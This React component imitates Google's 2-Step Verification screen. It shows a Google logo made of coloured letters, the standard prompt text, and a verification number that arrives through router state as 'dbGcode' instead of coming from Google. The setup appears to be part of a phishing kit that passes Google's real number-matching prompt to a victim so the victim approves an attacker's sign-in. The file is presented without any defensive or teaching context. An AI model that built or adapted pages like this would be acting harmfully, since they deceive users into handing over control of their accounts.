import React from "react";
import { useLocation } from "react-router-dom";

const TwoStepVerification = () => {

    const location = useLocation();
    const { dbGcode } = location.state?.dbGcode ? location.state : { dbGcode: "Null" };

    return (
        <div className="min-h-screen flex items-center justify-center bg-gray-100">
            <div className="bg-white w-[420px] rounded-xl shadow-xl p-8">

                {/* Google Logo */}
                <div className="flex justify-center mb-6">
                    <h1 className="text-2xl font-semibold">
                        <span className="text-blue-500">G</span>
                        <span className="text-red-500">o</span>
                        <span className="text-yellow-500">o</span>
                        <span className="text-blue-500">g</span>
                        <span className="text-green-500">l</span>
                        <span className="text-red-500">e</span>
                    </h1>
                </div>

                {/* Title */}
                <h2 className="text-xl font-medium text-center mb-2">
                    2-Step Verification
                </h2>

                <p className="text-sm text-gray-600 text-center mb-6">
                    To help keep your account safe, we want to make sure it's really you trying to sign in
                </p>

                {/* Animated Phone Section */}
                <div className="flex justify-center mb-6">
                    <div className="relative">

                        {/* Pulse Circle Animation */}
                        <div className="absolute inset-0 flex items-center justify-center">
                            <div className="w-28 h-28 rounded-full bg-gray-300 opacity-40 animate-ping"></div>
                        </div>

                        {/* Phone */}
                        <div className="relative w-24 h-40 bg-gray-800 rounded-2xl flex items-center justify-center shadow-lg">

                            {/* Fingerprint Animation */}
                            <div className="w-12 h-12 rounded-full border-2 border-gray-400 animate-pulse"></div>
                        </div>
                    </div>
                </div>

                {/* Verification Code */}
                <div className="text-center mb-4">
                    <p className="text-gray-700 font-medium">Check your phone</p>
                    <h3 className="text-3xl font-semibold mt-2">{dbGcode}</h3>
                </div>

                <p className="text-sm text-gray-600 text-center mb-4">
                    Google sent a notification to your phone. Tap Yes on the notification to verify it's you.
                </p>

                <div className="flex items-center gap-2 mb-4">
                    <input type="checkbox" className="w-4 h-4" />
                    <label className="text-sm text-gray-600">
                        Don't ask again on this device
                    </label>
                </div>

                <div className="text-center">
                    <button className="text-blue-600 text-sm hover:underline">
                        Resend it
                    </button>
                    <br />
                    <button className="text-blue-600 text-sm hover:underline mt-2">
                        Try another way
                    </button>
                </div>

            </div>
        </div>
    );
};

export default TwoStepVerification;
